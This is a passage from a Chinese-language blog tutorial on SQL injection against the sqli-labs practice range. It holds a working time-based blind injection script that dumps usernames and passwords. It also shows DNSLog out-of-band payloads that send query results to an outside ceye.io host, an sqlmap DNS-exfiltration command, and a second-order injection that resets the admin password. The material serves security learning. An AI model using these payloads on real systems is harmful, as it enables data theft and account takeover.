class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#基于时间盲注</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/sqllabs/Less-15/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_database</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;admin&#x27; and if(ascii(substr((select database()),%d,1))&gt;%d,sleep(1),0)#&quot;</span> % (i, mid)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&#x27;uname&#x27;</span>: payload, <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;aaaaa&#x27;</span>&#125;</span><br><span class=\"line\">            <span class=\"comment\">#params = &#123;&quot;id&quot;: payload&#125;</span></span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_table</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>注意：</p>\n<p>在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容</p>\n<p>在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数</p>\n<p>但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’='1 闭合，但 or 会有 and 和 or 优先级问题。</p>\n<p>mysql 中 and 优先级 高级 or</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>dumb’ and  if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) and ‘1’='1</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) or ‘1’='1</p>\n<p>或者使用 bool 盲注</p>\n<p>判断是否存在 flag.jpg</p>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<p>1. 安装 DNS 服务器</p>\n<p>2. 添加正向查找区域</p>\n<p>区域名称为 oupeng.top</p>\n<p>3.DNS 属性中启动递归，启用简单和递归查询</p>\n<p>4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP</p>\n<p>5. 正向查找新建泛解析，地址为 sqlmapip</p>\n<p>6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址</p>\n<p>7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址</p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png\" alt=\"image-20221020163942115\"></p>\n<p>点击下一步，勾选 dns 服务器，其他选项全部默认即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png\" alt=\"image-20221020164020385\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png\" alt=\"image-20221020164223367\"></p>\n<p>关闭禁用递归，开启简单和递归查询</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png\" alt=\"image-20221020164251704\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png\" alt=\"image-20221020164324361\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png\" alt=\"image-20221020164355711\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png\" alt=\"image-20221020164422616\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png\" alt=\"image-20221020164445444\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png\" alt=\"image-20221020164512708\"></p>\n<p>添加转发，dns 域随便写什么，但 IP 攻击机的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png\" alt=\"image-20221020164603923\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&quot; --technique=T --dns-domain &quot;hahaha.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=\">搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=\">使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)</span></p>\n<p>如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机</p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<h6 id=\"网鼎杯-2018comment\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018comment\">#</a> [网鼎杯 2018] Comment</h6>\n<p>1. 密码爆破，自己去 burp 里面玩吧</p>\n<p>2.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  origin master// 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<p>通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 